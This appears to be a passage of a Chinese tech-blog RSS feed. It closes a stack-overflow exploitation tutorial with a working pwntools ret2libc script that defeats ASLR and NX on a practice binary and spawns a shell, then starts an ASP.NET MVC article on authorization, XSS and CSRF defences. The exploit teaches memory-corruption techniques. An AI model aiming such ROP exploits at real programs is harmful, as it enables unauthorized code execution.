&lt;p&gt;通过简单的小学数学, 我们就能计算出想要的内存地址了, 加上第二阶段payload如下:&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode py&quot;&gt;
&lt;code class=&quot;sourceCode python&quot;&gt;&lt;span class=&quot;co&quot;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
&lt;span class=&quot;im&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;im&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;co&quot;&gt;# 地址&lt;/span&gt;
puts_plt &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bn&quot;&gt;0x8048350&lt;/span&gt;
puts_got &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bn&quot;&gt;0x804a010&lt;/span&gt;
entry_point &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bn&quot;&gt;0x8048390&lt;/span&gt;

&lt;span class=&quot;co&quot;&gt;# 偏移&lt;/span&gt;
offset_puts &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bn&quot;&gt;0x0005f870&lt;/span&gt;
offset_system &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bn&quot;&gt;0x0003ab30&lt;/span&gt;
offset_str_bin_sh &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bn&quot;&gt;0x15ce48&lt;/span&gt;

&lt;span class=&quot;kw&quot;&gt;def&lt;/span&gt; main():
    p &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; process(&lt;span class=&quot;st&quot;&gt;'./victim_nx'&lt;/span&gt;)
    &lt;span class=&quot;co&quot;&gt;# stage 1&lt;/span&gt;
    payload &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'A'&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;22&lt;/span&gt;
    ropchain &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; p32(puts_plt)
    ropchain &lt;span class=&quot;op&quot;&gt;+=&lt;/span&gt; p32(entry_point)
    ropchain &lt;span class=&quot;op&quot;&gt;+=&lt;/span&gt; p32(puts_got)
    payload &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; payload &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; ropchain
    log.info(&lt;span class=&quot;st&quot;&gt;'payload: {}'&lt;/span&gt;.&lt;span class=&quot;bu&quot;&gt;format&lt;/span&gt;(&lt;span class=&quot;bu&quot;&gt;repr&lt;/span&gt;(payload)))
    p.clean()
    p.sendline(payload)
    p.recvlines(&lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;)  &lt;span class=&quot;co&quot;&gt;#先忽略掉正常输出的一行&lt;/span&gt;
    leak &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; p.recv(&lt;span class=&quot;dv&quot;&gt;4&lt;/span&gt;)
    leak &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; u32(leak)
    log.info(&lt;span class=&quot;st&quot;&gt;'puts is at: 0x{:x}'&lt;/span&gt;.&lt;span class=&quot;bu&quot;&gt;format&lt;/span&gt;(leak))
    p.clean()

    &lt;span class=&quot;co&quot;&gt;# stage 2&lt;/span&gt;
    libc_base &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; leak &lt;span class=&quot;op&quot;&gt;-&lt;/span&gt; offset_puts
    log.info(&lt;span class=&quot;st&quot;&gt;'libc_base is at 0x{:x}'&lt;/span&gt;.&lt;span class=&quot;bu&quot;&gt;format&lt;/span&gt;(libc_base))
    payload &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'A'&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;22&lt;/span&gt;
    ropchain &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; p32(libc_base &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; offset_system)
    ropchain &lt;span class=&quot;op&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'BBBB'&lt;/span&gt;
    ropchain &lt;span class=&quot;op&quot;&gt;+=&lt;/span&gt; p32(libc_base &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; offset_str_bin_sh)
    payload &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; payload &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; ropchain
    p.sendline(payload)
    log.success(&lt;span class=&quot;st&quot;&gt;'Shell is comming!'&lt;/span&gt;)
    p.clean()
    p.interactive()


&lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'__main__'&lt;/span&gt;:
    main()&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;让我们运行一下看这个exploit的结果如何:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ python exp.py 
[+] Starting local process './victim_nx': pid 593
[*] payload: 'AAAAAAAAAAAAAAAAAAAAAAP\x83\x04\x08\x90\x83\x04\x08\x10\xa0\x04\x08'
[*] puts is at: 0xf7618870
[*] libc_base is at 0xf75b9000
[+] Shell is comming!
[*] Switching to interactive mode
$ whoami
pan
$ uname -a
Linux debian 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64 GNU/Linux
$ exit  
[*] Got EOF while reading in interactive
[*] Process './victim_nx' stopped with exit code -11 (SIGSEGV) (pid 593)
[*] Got EOF while sending in interactive&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;完美地绕过了ASLR和NX的保护, 成功获取shell! 这里把shellcode执行后的返回地址设为'BBBB',&lt;br/&gt;因为我们并不关心后续如何, 如果你想优雅退出程序的话, 将其改为&lt;code&gt;exit&lt;/code&gt;函数的地址即可,&lt;br/&gt;这个就留给同学们自己实现了:)&lt;/p&gt;
&lt;h3 id=&quot;windows&quot;&gt;Windows&lt;/h3&gt;
&lt;p&gt;最后提下Windows系统. Windows Vista及其之后的版本支持在链接可执行文件或DLL时启用ASLR,&lt;br/&gt;但对其他模块却默认不启用, 所以对于windows系统, 我们可以通过未启用ASLR的模块来绕过该保护.&lt;/p&gt;

&lt;p&gt;本文从最初的栈溢出开始, 逐步介绍了缓冲溢出的缓解措施以及绕过方法. 值得注意的是,&lt;br/&gt;每种漏洞缓解措施单独来看都是脆弱的, 比如ASLR本身无法防止jmp esp执行shellcode,&lt;br/&gt;而NX本身又很容易被ret2libc绕过. 很多漏洞缓解措施虽然各个操作系统实现不同,&lt;br/&gt;但原理也是相通的. 所以只有分别了解其原理, 才能在漏洞利用中灵活地选取突破策略.&lt;/p&gt;
&lt;p&gt;最后, 感谢RE4B群里小伙伴们的热心答疑, 特别是Larryxi大神, 总是能一针见血地指出&lt;br/&gt;问题要害!&lt;/p&gt;
</description>
<pubDate>Sat, 24 Mar 2018 02:39:00 +0000</pubDate>
<dc:creator>有价值炮灰</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/pannengzhi/p/exploit-the-stack.html</dc:identifier>
</item>
<item>
<title>ASP.NET MVC编程——验证、授权与安全 - 甜橙很酸</title>
<link>http://www.cnblogs.com/hdwgxz/p/8637421.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/hdwgxz/p/8637421.html</guid>
<description>&lt;p&gt;&lt;strong&gt;1 &lt;span&gt;验证&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;一般采用表单验证完成登陆验证，建议结合&lt;/span&gt;SSL&lt;span&gt;使用。为限制控制器只能执行&lt;/span&gt;&lt;span&gt;HTTPS&lt;/span&gt;&lt;span&gt;，使用&lt;/span&gt;&lt;span&gt;RequireHttpsAttribute&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2 &lt;span&gt;授权&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;对账户的权限的控制可以通过在控制器或控制器操作上加&lt;/span&gt;AuthorizeAttribute &lt;span&gt;属性。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;扩展授权过滤器&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;扩展授权过滤器可以定义继承自&lt;/span&gt;AuthorizeAttribute&lt;span&gt;的类，也可以定义同时继承自&lt;/span&gt;&lt;span&gt;FilterAttribute, IAuthorizationFilter&lt;/span&gt;&lt;span&gt;接口的类。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
    [AttributeUsage(AttributeTargets.Class | AttributeTargets.Method, Inherited = &lt;span&gt;true&lt;/span&gt;, AllowMultiple = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; AuthorizeAttribute : FilterAttribute, IAuthorizationFilter
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; AuthorizeAttribute(); 

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取或设置有权访问控制器或操作方法的用户角色&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Roles { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取此特性的唯一标识符。&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;object&lt;/span&gt; TypeId { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取或设置有权访问控制器或操作方法的用户。&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Users { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;重写时，提供一个入口点用于进行自定义授权检查
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回结果: 如果用户已经过授权，则为 true；否则为 false。
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 异常:System.ArgumentNullException:httpContext 参数为 null。&lt;/span&gt;
        &lt;span&gt;protected&lt;/span&gt; &lt;span&gt;virtual&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; AuthorizeCore(HttpContextBase httpContext);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;处理未能授权的 HTTP 请求。&lt;/span&gt;
        &lt;span&gt;protected&lt;/span&gt; &lt;span&gt;virtual&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; HandleUnauthorizedRequest(AuthorizationContext filterContext);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;在过程请求授权时调用。
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 异常: System.ArgumentNullException:
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;filterContext 参数为 null。&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;virtual&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; OnAuthorization(AuthorizationContext filterContext);
        
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回结果: 对验证状态的引用。
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 异常:System.ArgumentNullException:
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; httpContext 参数为 null。&lt;/span&gt;
        &lt;span&gt;protected&lt;/span&gt; &lt;span&gt;virtual&lt;/span&gt;&lt;span&gt; HttpValidationStatus OnCacheAuthorization(HttpContextBase httpContext);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;AuthorizeAttribute&lt;span&gt;提供了三个可重新的虚方法&lt;/span&gt;AuthorizeCore&lt;span&gt;，&lt;/span&gt;HandleUnauthorizedRequest&lt;span&gt;，&lt;/span&gt;OnAuthorization&lt;span&gt;，那么在执行授权动作的过程中他们是如何被调用的呢？&lt;/span&gt;&lt;span&gt;看下源码的&lt;/span&gt;OnAuthorization方法，发现在这个方法中先调用AuthorizeCore，然后调用HandleUnauthorizedRequest被调用了。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;virtual&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; OnAuthorization(AuthorizationContext filterContext)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (filterContext == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; ArgumentNullException(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;filterContext&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }&lt;br/&gt;&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果子操作的缓存处于活动状态，那么就抛出异常&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (OutputCacheAttribute.IsChildActionCacheActive(filterContext))
            {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; InvalidOperationException(MvcResources.AuthorizeAttribute_CannotUseWithinChildActionCache);
            }&lt;br/&gt;&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断控制器或控制器操作是否允许匿名访问，如果可以就return&lt;/span&gt;
            &lt;span&gt;bool&lt;/span&gt; skipAuthorization = filterContext.ActionDescriptor.IsDefined(&lt;span&gt;typeof&lt;/span&gt;(AllowAnonymousAttribute), inherit: &lt;span&gt;true&lt;/span&gt;)|| filterContext.ActionDescriptor.ControllerDescriptor.IsDefined(&lt;span&gt;typeof&lt;/span&gt;(AllowAnonymousAttribute), inherit: &lt;span&gt;true&lt;/span&gt;&lt;span&gt;);

            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (skipAuthorization)
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
            }&lt;br/&gt;&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;进行权限验证&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (AuthorizeCore(filterContext.HttpContext))
            {
                HttpCachePolicyBase cachePolicy &lt;/span&gt;=&lt;span&gt; filterContext.HttpContext.Response.Cache;
                cachePolicy.SetProxyMaxAge(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; TimeSpan(&lt;span&gt;0&lt;/span&gt;&lt;span&gt;));
                cachePolicy.AddValidationCallback(CacheValidateHandler, &lt;/span&gt;&lt;span&gt;null&lt;/span&gt; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; data &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;);
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;处理未通过权限验证的情形&lt;/span&gt;
&lt;span&gt;                HandleUnauthorizedRequest(filterContext);
            }
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;当子操作缓存处于活动状态，那么抛出异常。然后检验是否可匿名访问，如果可以匿名访问就不进行验证；&lt;/p&gt;
&lt;p&gt;&lt;span&gt;综合以上分析，扩展&lt;/span&gt;AuthorizeAttribute&lt;span&gt;要注意：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;1）&lt;span&gt;在子类&lt;/span&gt;AuthorizeCore&lt;span&gt;中，调用父类的&lt;/span&gt;&lt;span&gt;AuthorizeCore&lt;/span&gt;&lt;span&gt;方法&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;base.OnAuthorization(filterContext);&lt;/p&gt;
&lt;p&gt;2）&lt;span&gt;在子类的&lt;/span&gt;AuthorizeCore&lt;span&gt;方法中验证用户的权限。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;3）&lt;span&gt;通过子类的构造函数传入用户的权限值&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;代码示例如下：&lt;/span&gt;&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; CustomAuthorizeAttribute : AuthorizeAttribute
{
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; UserRole role;
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; CustomAuthorizeAttribute(UserRole role)
        {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.role =&lt;span&gt; role;
        }
        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; AuthorizeCore(HttpContextBase httpContext)
        {
            &lt;/span&gt;&lt;span&gt;bool&lt;/span&gt; ret = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;获得用户信息(从本地Session或分布式缓存中获取)&lt;/span&gt;
            &lt;span&gt;var&lt;/span&gt; userInfo =&lt;span&gt; ......
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(userInfo==&lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;信息为null，一般认为登陆超时或没有登陆&lt;/span&gt;
&lt;span&gt;            }

            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(userInfo.Role ==&lt;span&gt; UserRole.Org)
            {
                ret &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;提示无权限&lt;/span&gt;
&lt;span&gt;            }

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; ret;
        }
        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; HandleUnauthorizedRequest(AuthorizationContext filterContext)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (filterContext == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; ArgumentNullException(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;filterContext&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }

            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (filterContext.HttpContext.Request.IsAjaxRequest())
            {&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;针对ajax请求进行处理&lt;/span&gt;
&lt;span&gt;                
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;非aiax进行处理
                
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;跳转到指定页面&lt;/span&gt;
                &lt;span&gt;string&lt;/span&gt; strUrl =&lt;span&gt; ......;
                filterContext.Result &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; RedirectResult(strUrl);
            }
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; OnAuthorization(AuthorizationContext filterContext)
        {
            &lt;/span&gt;&lt;span&gt;base&lt;/span&gt;&lt;span&gt;.OnAuthorization(filterContext);
        }
    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;enum&lt;/span&gt;&lt;span&gt; UserRole
    {
        Org &lt;/span&gt;= &lt;span&gt;1&lt;/span&gt;&lt;span&gt;,
        Vip &lt;/span&gt;= &lt;span&gt;2&lt;/span&gt;&lt;span&gt;,
        Guest &lt;/span&gt;= &lt;span&gt;3&lt;/span&gt;&lt;span&gt;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;3 &lt;span&gt;安全&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;总的原则：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所有层或各个子系统各自负责好自己的安全。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;任何用户数据和来自其他系统的数据都要经过检验。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在满足需求的情况下，尽量缩小账户的权限。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;减少暴露的操作数量和操作参数。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;关闭服务器不需要的功能。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4 &lt;span&gt;防范攻击&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4.1&lt;span&gt;跨站脚本攻击（&lt;/span&gt;&lt;span&gt;XSS&lt;/span&gt;&lt;span&gt;）&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;被动注入：用户的输入含有恶意脚本，而网站又能够不加检验地接受这样的输入，进而保存到数据库中。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;主动注入：用户将含有恶意脚本的内容输入到页面文本框中，然后在屏幕上显示出来。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;防御方法：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1）&lt;span&gt;使用&lt;/span&gt;Razor&lt;span&gt;语法输出的内容已经被编码，可以不做任何其他处理&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;例如：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&amp;lt;h4&amp;gt;@Model.Field&amp;lt;/h4&amp;gt;
&lt;/pre&gt;
&lt;p&gt;Html.ActionLink,Html.Action等方法会将路由参数编码输出&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;2）&lt;span&gt;大部分的&lt;/span&gt;XSS&lt;span&gt;攻击可通过对输入内容进行编码来阻止：&lt;/span&gt;&lt;span&gt;Html.Encode&lt;/span&gt;&lt;span&gt;，&lt;/span&gt;&lt;span&gt;Html.AttributeEncode&lt;/span&gt;&lt;span&gt;，&lt;/span&gt;&lt;span&gt;Url.Encode&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;3）&lt;span&gt;对&lt;/span&gt;Js&lt;span&gt;进行编码&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;使用&lt;/span&gt;Ajax.JavaScriptStringEncode&lt;/p&gt;
&lt;p&gt;4）&lt;span&gt;将&lt;/span&gt;AntiXSS&lt;span&gt;库作为默认的编码器（不建议使用，不灵活）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ASP.NET 4.5 &lt;span&gt;集成&lt;/span&gt;&lt;span&gt;Anti-XSS Library&lt;/span&gt;&lt;span&gt;，可以通过配置来对整个网站的输出进行编码。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&amp;lt;system.web&amp;gt;
    &amp;lt;httpRuntime targetFramework=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;4.5&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; encoderType=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;System.Web.Security.AntiXss.AntiXssEncoder,System.Web&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;/&amp;gt;
&amp;lt;/system.web&amp;gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;4.2&lt;span&gt;跨站请求伪造（&lt;/span&gt;&lt;span&gt;CSRF/XSRF&lt;/span&gt;&lt;span&gt;）&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;防御方法：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1）&lt;span&gt;使用&lt;/span&gt;Html&lt;span&gt;隐藏域存储用户令牌，令牌可以存储在&lt;/span&gt;&lt;span&gt;Session&lt;/span&gt;&lt;span&gt;里或者&lt;/span&gt;&lt;span&gt;cookie&lt;/span&gt;&lt;span&gt;里&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;2）&lt;span&gt;在视图表单中使用&lt;/span&gt;@Html.AntiForgeryToken()&lt;span&gt;，在控制器操作上添加属性&lt;/span&gt;[ValidateAntiForgeryToken]&lt;span&gt;，注意表单一定要使用&lt;/span&gt;@Html.BeginForm生成&lt;/p&gt;
&lt;p&gt;&lt;span&gt;实现机制：&lt;/span&gt;AntiForgeryToken&lt;span&gt;方法向用户浏览器&lt;/span&gt;cookie中写入一个加密的数据，并在表单内插入一个隐藏栏位，每次刷新页面时隐藏栏位的值都不同，每次执行控制器操作前，都会验证隐藏栏位和浏览器cookie中的值是否相同，只有相同才允许执行控制器操作。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;使用限制：&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;客户端浏览器不能禁用&lt;/span&gt;cookie&lt;/li&gt;
&lt;li&gt;&lt;span&gt;只对&lt;/span&gt;post&lt;span&gt;请求有效&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;若有&lt;/span&gt;XSS&lt;span&gt;漏洞，则可轻易获取令牌&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;对&lt;/span&gt;Ajax&lt;span&gt;请求不能传递令牌，即对&lt;/span&gt;&lt;span&gt;Ajax&lt;/span&gt;&lt;span&gt;无效&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;3）&lt;span&gt;使用幂等的&lt;/span&gt;Get&lt;span&gt;请求，仅使用&lt;/span&gt;&lt;span&gt;Post&lt;/span&gt;&lt;span&gt;请求修改数据（仅仅是一定程度上限制这种攻击而已）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;4）&lt;span&gt;使用动作过滤器，验证&lt;/span&gt;UrlReferrer&lt;/p&gt;
&lt;p&gt;&lt;span&gt;扩展的动作过滤器：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; CSRFFilter:AuthorizeAttribute
{
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; OnAuthorization(AuthorizationContext filterContext)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (filterContext.HttpContext == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; HttpException(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;请求无效&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }

            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (filterContext.HttpContext.Request.UrlReferrer == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; HttpException(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;请求无效&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }

            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (filterContext.HttpContext.Request.UrlReferrer.Host != &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;sit.com&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            {
